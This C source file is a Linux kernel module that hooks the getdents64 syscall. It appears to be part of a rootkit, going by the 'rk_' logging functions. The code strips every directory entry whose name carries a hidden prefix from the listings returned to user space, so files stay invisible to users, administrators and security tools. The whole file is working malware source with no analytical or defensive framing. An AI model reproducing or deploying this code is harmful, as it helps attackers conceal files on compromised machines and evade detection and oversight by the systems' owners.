#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "../../logger/logger.h"
#include "../utils.h"
#include "getdents64.h"

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

asmlinkage long (*real_getdents64)(const struct pt_regs *);

// ////////////////////////////////////////////////////////////////////

asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *user_dir = (void *)regs->si;

    struct linux_dirent64
        *kernel_dir_buffer = NULL,
        *current_entry = NULL;

    unsigned long offset = 0;

    long ret = real_getdents64(regs);

    // rk_info("getdents64() true return: %ld\n", ret);

    if (ret <= 0)
        return ret;

    kernel_dir_buffer = kmalloc(ret, GFP_KERNEL);
    if (!kernel_dir_buffer) {
        rk_err("[hook_getdents64] getdents64() failed to allocate kernel buffer\n");
        return -ENOMEM;
    }

    if (copy_from_user(kernel_dir_buffer, user_dir, ret)) {
        kfree(kernel_dir_buffer);
        rk_err("[hook_getdents64] getdents64() failed to copy kernel buffer\n");
        return -EFAULT;
    }

    while (offset < ret) {
        current_entry = (void *)((char *)kernel_dir_buffer + offset);

        if (is_hidden_name(current_entry->d_name, HIDDEN_PREFIX)) {
            rk_info("[hook_getdents64] getdents64() returned hidden entry: %s\n", current_entry->d_name);

            unsigned int bytes_to_hide = current_entry->d_reclen;

            memmove(
                current_entry,
                (char *)current_entry + bytes_to_hide,
                ret - offset - bytes_to_hide
            );

            ret -= bytes_to_hide;
        } else {
            offset += current_entry->d_reclen;
        }
    }

    if (copy_to_user(user_dir, kernel_dir_buffer, ret)) {
        kfree(kernel_dir_buffer);
        rk_err("[hook_getdents64] getdents64() failed to copy to user buffer\n");
        return -EFAULT;
    }

    kfree(kernel_dir_buffer);

    return ret;
}

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

EXPORT_SYMBOL(hook_getdents64);
EXPORT_SYMBOL(real_getdents64);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Aspheric_");
MODULE_DESCRIPTION("Hooks getdents64");
